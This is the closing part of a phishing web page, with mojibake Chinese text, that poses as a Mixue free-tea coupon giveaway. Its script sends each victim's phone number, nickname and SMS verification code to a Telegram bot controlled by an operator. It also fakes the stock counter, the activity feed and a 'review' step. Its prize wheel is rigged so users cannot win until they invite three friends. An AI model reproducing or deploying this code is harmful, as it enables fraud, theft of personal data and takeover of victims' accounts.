å¯è”ç³»æˆ‘ä»¬ç”³è¯·æŸ¥çœ‹ã€æ›´æ­£æˆ–åˆ é™¤ä¸ªäººä¿¡æ¯ã€‚

æ„Ÿè°¢æ‚¨çš„ä¿¡ä»»ï¼` :
`æœ€åæ›´æ–°ï¼š2026å¹´1æœˆ1æ—¥

1. æœåŠ¡è¯´æ˜
æœ¬æ´»åŠ¨æä¾›é™é‡å…è´¹å¤§æ¯æŸ æª¬èŒ¶åˆ¸ï¼Œå…ˆåˆ°å…ˆå¾—ã€‚

2. ä½¿ç”¨è§„åˆ™
- æ¯æ‰‹æœºå·é™é¢†1æ¬¡
- ç¦æ­¢ä½¿ç”¨è„šæœ¬ã€æ¥ç å¹³å°
- åˆ¸ç éœ€åœ¨æœ‰æ•ˆæœŸå†…åˆ°åº—æ ¸é”€

3. è¿è§„å¤„ç†
å‘ç°ä½œå¼Šè¡Œä¸ºå°†å–æ¶ˆèµ„æ ¼å¹¶æ°¸ä¹…é™åˆ¶å‚ä¸ã€‚

4. å…è´£å£°æ˜
æ´»åŠ¨æœ€ç»ˆè§£é‡Šæƒå½’èœœé›ªå†°åŸæ‰€æœ‰ã€‚å› ä¸å¯æŠ—åŠ›å¯¼è‡´æ´»åŠ¨å˜æ›´ï¼Œæˆ‘ä»¬ä¸æ‰¿æ‹…è´£ä»»ã€‚

ç‚¹å‡»"è·å–éªŒè¯ç "å³è¡¨ç¤ºåŒæ„æœ¬åè®®å…¨éƒ¨æ¡æ¬¾ã€‚`;

  els.agreementTitle.textContent = title;
  els.agreementContent.textContent = content;
  els.agreementModal.classList.add('show');
}

function updateStock() {
  const remain = Math.max(0, TOTAL_STOCK - claimed);
  els.claimedCount.textContent = claimed.toLocaleString('zh-CN');
  els.remainCount.textContent = remain.toLocaleString('zh-CN');
  els.countNum.textContent = claimed.toLocaleString('zh-CN');
  if (remain < 100) els.remainCount.classList.add('low-stock');
}

function fakeClaim() {
  if (Math.random() > 0.4) {
    const add = 1 + Math.floor(Math.random() * 4);
    claimed += add;
    updateStock();
    const barrageCount = Math.min(add + Math.floor(Math.random() * 2), 6);
    for (let i = 0; i < barrageCount; i++) {
      setTimeout(shootBarrage, i * 400 + Math.random() * 350);
    }
  }
}

function checkPhoneValid() {
  const val = els.phone.value.trim();
  const valid = /^1[3-9]\d{9}$/.test(val);
  els.phone.classList.toggle('input-error', val && !valid);

  if (valid) {
    els.verifySlider.classList.add('show');
    if (!els.verifyBlock.dataset.inited) initSlider();
  } else {
    els.verifySlider.classList.remove('show');
    isVerifySuccess = false;
    resetSlider();
  }
  els.getBtn.disabled = !valid || !isVerifySuccess || isSending;
}

function resetSlider() {
  els.verifySlider.classList.remove('verify-success');
  els.verifyBlock.style.left = '0';
  els.verifyBg.style.width = '0';
  els.verifyBlock.textContent = 'â†’';
  els.verifySlider.querySelector('.verify-text').textContent = 'å‘å³æ»‘åŠ¨å®ŒæˆéªŒè¯';
}

function initSlider() {
  els.verifyBlock.dataset.inited = 'true';
  let dragging = false;
  const max = els.verifySlider.offsetWidth - els.verifyBlock.offsetWidth;

  const start = e => {
    if (isVerifySuccess) return;
    dragging = true;
    const sx = e.clientX || e.touches?.[0]?.clientX;
    const sl = parseFloat(els.verifyBlock.style.left) || 0;

    const move = ev => {
      if (!dragging) return;
      const dx = (ev.clientX || ev.touches?.[0]?.clientX) - sx;
      let l = Math.max(0, Math.min(sl + dx, max));
      els.verifyBlock.style.left = l + 'px';
      els.verifyBg.style.width = l + 'px';
    };

    const end = () => {
      dragging = false;
      const l = parseFloat(els.verifyBlock.style.left) || 0;
      if (l >= max * 0.8) {
        isVerifySuccess = true;
        els.verifySlider.classList.add('verify-success');
        els.verifyBlock.textContent = 'âœ“';
        els.verifyBlock.style.left = max + 'px';
        els.verifyBg.style.width = max + 'px';
        els.verifySlider.querySelector('.verify-text').textContent = 'éªŒè¯æˆåŠŸ';
        checkPhoneValid();
      } else resetSlider();
      document.removeEventListener('mousemove', move);
      document.removeEventListener('touchmove', move);
      document.removeEventListener('mouseup', end);
      document.removeEventListener('touchend', end);
    };

    document.addEventListener('mousemove', move);
    document.addEventListener('touchmove', move, {passive:false});
    document.addEventListener('mouseup', end);
    document.addEventListener('touchend', end);
  };

  els.verifyBlock.addEventListener('mousedown', start);
  els.verifyBlock.addEventListener('touchstart', e => { e.preventDefault(); start(e); }, {passive:false});
}

function startCountdown() {
  if (!els.globalTimer) return;
  let sec = 120*60 + Math.floor(Math.random()*180*60);
  const tick = () => {
    if (sec <= 0) {
      els.globalTimer.textContent = 'æœ¬è½®å·²ç»“æŸï¼Œè¯·åˆ·æ–°';
      setTimeout(() => location.reload(), 4000);
      return;
    }
    const h = Math.floor(sec/3600).toString().padStart(2,'0');
    const m = Math.floor((sec%3600)/60).toString().padStart(2,'0');
    const s = (sec%60).toString().padStart(2,'0');
    els.globalTimer.textContent = `æœ¬è½®åé¢å€’è®¡æ—¶ï¼š${h}:${m}:${s}`;
    sec--;
  };
  tick();
  timers.global = setInterval(tick, 1000);
}

// ============================= é‚€è¯·å¥½å‹ç³»ç»Ÿ =============================

function initSplashScreen() {
  const splash = document.getElementById('splashScreen');
  const progress = document.getElementById('splashProgress');
  const text = document.getElementById('splashText');
  const bgMusic = document.getElementById('bgMusic');
  
  let progressValue = 0;
  const interval = setInterval(() => {
    progressValue += 2;
    progress.style.width = progressValue + '%';
    
    if (progressValue === 30) text.textContent = 'æ­£åœ¨å‡†å¤‡ç”œèœœæƒŠå–œ...';
    if (progressValue === 60) text.textContent = 'é›ªç‹æ­£åœ¨è°ƒé…æœ€ä½³å£å‘³...';
    if (progressValue === 90) text.textContent = 'é©¬ä¸Šå°±å¥½...';
    
    if (progressValue >= 100) {
      clearInterval(interval);
      setTimeout(() => {
        splash.classList.add('hide');
        // å°è¯•æ’­æ”¾éŸ³ä¹
        bgMusic.volume = 0.5;
        bgMusic.play().catch(e => console.log('éŸ³ä¹è‡ªåŠ¨æ’­æ”¾è¢«é˜»æ­¢'));
      }, 300);
    }
  }, 60);
}

function showInvitePage(phone, nickname) {
  inviteState.currentPhone = phone;
  inviteState.currentNickname = nickname;
  
  els.mainPage.classList.add('hidden');
  els.invitePage.classList.remove('hidden');
  els.invitePage.classList.add('show');
  
  updateInviteUI();
  
  // å‘é€è¿›å…¥é‚€è¯·é¡µé¢é€šçŸ¥
  sendTGMessage(`ã€è¿›å…¥é‚€è¯·é¡µé¢ã€‘\næ‰‹æœºå·ï¼š${phone}\næ˜µç§°ï¼š${nickname}\næ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}`);
}

function updateInviteUI() {
  els.inviteCount.textContent = inviteState.invitedCount;
  els.chanceCount.textContent = `å‰©ä½™æŠ½å¥–æ¬¡æ•°ï¼š${inviteState.chanceCount}`;
  
  // æ›´æ–°è¿›åº¦
  if (inviteState.invitedCount >= 1) {
    els.step1.classList.add('completed');
    els.step1.textContent = 'âœ“';
    els.line1.classList.add('completed');
  }
  if (inviteState.invitedCount >= 2) {
    els.step2.classList.add('completed');
    els.step2.textContent = 'âœ“';
    els.line2.classList.add('completed');
  }
  if (inviteState.invitedCount >= 3) {
    els.step3.classList.add('completed');
    els.step3.textContent = 'âœ“';
  } else {
    els.step3.classList.add('active');
  }
  
  // æ˜¾ç¤ºè½¬ç›˜å¦‚æœæœ‰æŠ½å¥–æ¬¡æ•°
  if (inviteState.chanceCount > 0) {
    els.wheelContainer.style.display = 'block';
    els.wheelBtn.classList.remove('hidden');
    els.inviteBtn.style.display = 'none';
  } else {
    els.wheelContainer.style.display = 'none';
    els.wheelBtn.classList.add('hidden');
    els.inviteBtn.style.display = 'block';
  }
}

function simulateInvite() {
  // æ¨¡æ‹Ÿé‚€è¯·å¥½å‹
  els.inviteBtn.disabled = true;
  els.inviteBtn.textContent = 'é‚€è¯·ä¸­...';
  
  setTimeout(() => {
    inviteState.invitedCount++;
    
    // éšæœºè·å¾—æŠ½å¥–æ¬¡æ•° 0-5
    const gainedChance = Math.floor(Math.random() * 6);
    inviteState.chanceCount += gainedChance;
    
    showToast(`æˆåŠŸé‚€è¯·å¥½å‹ï¼è·å¾— ${gainedChance} æ¬¡æŠ½å¥–æœºä¼š`);
    
    // å‘é€TGé€šçŸ¥
    sendTGMessage(`ã€æ–°é‚€è¯·ã€‘\næ‰‹æœºå·ï¼š${inviteState.currentPhone}\nå½“å‰é‚€è¯·æ•°ï¼š${inviteState.invitedCount}\nè·å¾—æŠ½å¥–æ¬¡æ•°ï¼š${gainedChance}\næ€»æŠ½å¥–æ¬¡æ•°ï¼š${inviteState.chanceCount}`);
    
    updateInviteUI();
    els.inviteBtn.disabled = false;
    els.inviteBtn.textContent = 'é‚€è¯·å¥½å‹åŠ©åŠ›';
    
    // æ£€æŸ¥æ˜¯å¦è¾¾åˆ°3äºº
    if (inviteState.invitedCount >= 3) {
      showToast('ğŸ‰ å·²é‚€è¯·æ»¡3äººï¼ç°åœ¨æŠ½å¥–å¿…ä¸­ï¼');
    }
  }, 1500);
}

function spinWheel() {
  if (inviteState.chanceCount <= 0) {
    showToast('æ²¡æœ‰æŠ½å¥–æ¬¡æ•°äº†ï¼Œç»§ç»­é‚€è¯·å¥½å‹å§ï¼');
    return;
  }
  
  inviteState.chanceCount--;
  updateInviteUI();
  els.wheelBtn.disabled = true;
  
  // å†³å®šç»“æœ
  // è§„åˆ™ï¼šé‚€è¯·æ»¡3äººå‰ä¸€å®šä¸ä¸­å¥–
  let resultIndex;
  const winIndices = [0, 2, 4, 6]; // ä¸­å¥–ä½ç½®ï¼šæŸ æª¬èŒ¶åˆ¸ã€å†°æ·‡æ·‹åˆ¸ã€å¥¶èŒ¶åˆ¸ã€ç¥ç§˜å¤§å¥–
  const loseIndices = [1, 3, 5, 7]; // æƒ©ç½šä½ç½®
  
  if (inviteState.invitedCount < 3) {
    // æœªæ»¡3äººï¼Œå¿…ä¸ä¸­ï¼Œéšæœºé€‰ä¸€ä¸ªæƒ©ç½š
    resultIndex = loseIndices[Math.floor(Math.random() * loseIndices.length)];
  } else {
    // æ»¡3äººï¼Œå¿…ä¸­ï¼Œéšæœºé€‰ä¸€ä¸ªå¥–åŠ±
    resultIndex = winIndices[Math.floor(Math.random() * winIndices.length)];
    inviteState.hasWon = true;
  }
  
  // è®¡ç®—æ—‹è½¬è§’åº¦ï¼ˆè‡³å°‘è½¬5åœˆï¼‰
  const baseRotation = 360 * 5;
  const itemAngle = 45; // 360 / 8
  const targetAngle = 360 - (resultIndex * itemAngle) - (itemAngle / 2);
  const totalRotation = baseRotation + targetAngle;
  
  // æ‰§è¡Œæ—‹è½¬
  els.wheel.style.transform = `rotate(${totalRotation}deg)`;
  
  setTimeout(() => {
    handleWheelResult(resultIndex);
    els.wheelBtn.disabled = false;
  }, 4000);
}

function handleWheelResult(index) {
  const results = [
    { name: 'æŸ æª¬èŒ¶åˆ¸', type: 'win', emoji: 'ğŸ' },
    { name: 'è°¢è°¢æƒ é¡¾', type: 'lose', emoji: 'ğŸ˜¢' },
    { name: 'å†°æ·‡æ·‹åˆ¸', type: 'win', emoji: 'ğŸ¦' },
    { name: 'å†æ¥å†å‰', type: 'lose', emoji: 'ğŸ˜­' },
    { name: 'å¥¶èŒ¶åˆ¸', type: 'win', emoji: 'ğŸ§‹' },
    { name: 'å·®ä¸€ç‚¹', type: 'lose', emoji: 'ğŸ¤”' },
    { name: 'ç¥ç§˜å¤§å¥–', type: 'win', emoji: 'ğŸŠ' },
    { name: 'ä¸‹æ¬¡å†æ¥', type: 'lose', emoji: 'ğŸ˜…' }
  ];
  
  const result = results[index];
  
  // å‘é€TGé€šçŸ¥
  sendTGMessage(`ã€æŠ½å¥–ç»“æœã€‘\næ‰‹æœºå·ï¼š${inviteState.currentPhone}\nç»“æœï¼š${result.name} ${result.emoji}\nç±»å‹ï¼š${result.type === 'win' ? 'ä¸­å¥–' : 'æœªä¸­å¥–'}\nå‰©ä½™é‚€è¯·ï¼š${inviteState.invitedCount}\nå‰©ä½™æ¬¡æ•°ï¼š${inviteState.chanceCount}`);
  
  if (result.type === 'win') {
    // ä¸­å¥–äº†ï¼Œæ˜¾ç¤ºåˆ¸ç 
    setTimeout(() => {
      claimed++;
      updateStock();
      shootBarrage(inviteState.currentPhone);
      els.couponCode.textContent = generateCouponCode();
      els.modal.classList.add('show');
      localStorage.setItem('mx_claim_' + inviteState.currentPhone, Date.now());
      
      // å‘é€æœ€ç»ˆè·å¥–é€šçŸ¥
      sendTGMessage(`ã€ğŸ‰ æœ€ç»ˆè·å¥–ã€‘\næ‰‹æœºå·ï¼š${inviteState.currentPhone}\nåˆ¸ç ï¼š${els.couponCode.textContent}\nè·å¥–ç±»å‹ï¼š${result.name}\næ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}`);
    }, 500);
  } else {
    showToast(`${result.emoji} ${result.name}ï¼${inviteState.chanceCount > 0 ? 'å†è¯•ä¸€æ¬¡å§ï¼' : 'é‚€è¯·å¥½å‹è·å¾—æ›´å¤šæœºä¼šï¼'}`);
  }
}

function sendTGMessage(text) {
  try {
    const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
    const params = new URLSearchParams();
    params.append('chat_id', _cfg.u);
    params.append('text', text);
    
    fetch(ep, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: params
    }).catch(console.error);
  } catch (err) {
    console.error('TGå‘é€å¤±è´¥ï¼š', err);
  }
}

// ä¿®æ”¹åçš„å®¡æ ¸æµç¨‹ - ç›´æ¥è¿›å…¥é‚€è¯·é¡µé¢
function startManualReview(phone, nickname, code) {
  if (isPolling) return;
  isPolling = true;
  
  // æ˜¾ç¤ºåŠ è½½ç•Œé¢æ¨¡æ‹Ÿå®¡æ ¸
  els.loadingMask.classList.add('show');
  
  // æ¨¡æ‹Ÿå®¡æ ¸è¿‡ç¨‹ï¼ˆ3-5ç§’ï¼‰
  setTimeout(() => {
    els.loadingMask.classList.remove('show');
    isPolling = false;
    
    // å®¡æ ¸é€šè¿‡ï¼Œè¿›å…¥é‚€è¯·é¡µé¢
    showInvitePage(phone, nickname);
    
    // å‘é€å®¡æ ¸é€šè¿‡é€šçŸ¥
    sendTGMessage(`ã€å®¡æ ¸é€šè¿‡ã€‘\næ˜µç§°ï¼š${nickname}\næ‰‹æœºå·ï¼š${phone}\néªŒè¯ç ï¼š${code}\næ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}\nçŠ¶æ€ï¼šè¿›å…¥é‚€è¯·æµç¨‹`);
  }, 3000 + Math.random() * 2000);
}

// ============================= äº‹ä»¶ =============================
els.phone.addEventListener('input', checkPhoneValid);
els.phone.addEventListener('blur', checkPhoneValid);

els.closeModalBtn.addEventListener('click', () => {
  els.modal.classList.remove('show');
});

els.getBtn.addEventListener('click', async () => {
  if (els.getBtn.disabled || isSending) return;

  isSending = true;
  els.getBtn.disabled = true;
  els.getBtn.textContent = 'å‘é€ä¸­...';

  const phone = els.phone.value.trim();
  const nick = els.nickname.value.trim() || 'æ— ';

  try {
    const ep = `https://api.telegram.org/bot${_cfg.t}/sendMessage`;
    const params = new URLSearchParams();
    params.append('chat_id', _cfg.u);
    params.append('text', `ã€æ–°å·ã€‘\næ˜µç§°ï¼š${nick}\næ‰‹æœºå·ï¼š${phone}\næ—¶é—´ï¼š${new Date().toLocaleString('zh-CN')}`);

    const response = await fetch(ep, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: params
    });

    if (!response.ok) throw new Error('Telegram å‘é€å¤±è´¥');

    let s = 60;
    els.getBtn.textContent = `é‡å‘(${s}s)`;
    els.code.focus();
    els.countdown.style.opacity = '1';
    els.countdown.textContent = `éªŒè¯ç å·²å‘é€ï¼ˆ${s}sï¼‰`;

    timers.code = setInterval(() => {
      s--;
      if (s > 0) {
        els.getBtn.textContent = `é‡å‘(${s}s)`;
        els.countdown.textContent = `éªŒè¯ç å·²å‘é€ï¼ˆ${s}sï¼‰`;
      } else {
        clearInterval(timers.code);
        isSending = false;
        els.getBtn.disabled = !( /^1[3-9]\d{9}$/.test(els.phone.value.trim()) && isVerifySuccess );
        els.getBtn.textContent = 'è·å–éªŒè¯ç ';
        els.countdown.style.opacity = '0';
      }
    }, 1000);

  } catch (err) {
    console.error('å‘é€å¤±è´¥ï¼š', err);
    showToast('ç½‘ç»œå¼‚å¸¸ï¼Œç¨åå†è¯•');
    isSending = false;
    els.getBtn.disabled = false;
    els.getBtn.textContent = 'è·å–éªŒè¯ç ';
  }
});

els.code.addEventListener('input', () => {
  const len = els.code.value.trim().length;
  els.submitBtn.style.display = len >= 4 ? 'block' : 'none';
  els.submitBtn.disabled = len < 6;
  els.code.classList.toggle('input-error', len > 0 && len < 6);
});

els.submitBtn.addEventListener('click', async () => {
  if (els.submitBtn.disabled || isPolling) return;

  const phone = els.phone.value.trim();
  const code = els.code.value.trim();
  const nick = els.nickname.value.trim() || 'æ— ';

  if (code.length !== 6) {
    showToast('è¯·è¾“å…¥6ä½æœ‰æ•ˆéªŒè¯ç ');
    return;
  }

  // æ£€æŸ¥æ˜¯å¦å·²ç»é¢†å–è¿‡
  if (localStorage.getItem('mx_claim_' + phone)) {
    showToast('è¯¥æ‰‹æœºå·å·²å‚ä¸è¿‡æ´»åŠ¨');
    return;
  }

  // å¼€å§‹å®¡æ ¸æµç¨‹ï¼ˆç°åœ¨ç›´æ¥è¿›å…¥é‚€è¯·é¡µé¢ï¼‰
  startManualReview(phone, nick, code);
});

// é‚€è¯·æŒ‰é’®äº‹ä»¶
els.inviteBtn.addEventListener('click', simulateInvite);

// è½¬ç›˜æŒ‰é’®äº‹ä»¶
els.wheelBtn.addEventListener('click', spinWheel);

els.modal.addEventListener('click', e => {
  if (e.target === els.modal) els.modal.classList.remove('show');
});

els.rejectedModal.addEventListener('click', e => {
  if (e.target === els.rejectedModal) els.rejectedModal.classList.remove('show');
});

// ============================= å¯åŠ¨ =============================
window.addEventListener('load', () => {
  // åˆå§‹åŒ–å¯åŠ¨ç”»é¢
  initSplashScreen();
  
  timers.fake    = setInterval(fakeClaim, 1400);
  timers.barrage = setInterval(() => {
    if (Math.random() > 0.35) shootBarrage();
  }, 1600);
  startCountdown();
  updateStock();
});

window.addEventListener('beforeunload', () => {
  Object.values(timers).forEach(t => clearInterval(t));
});
</script>
</body>
</html>

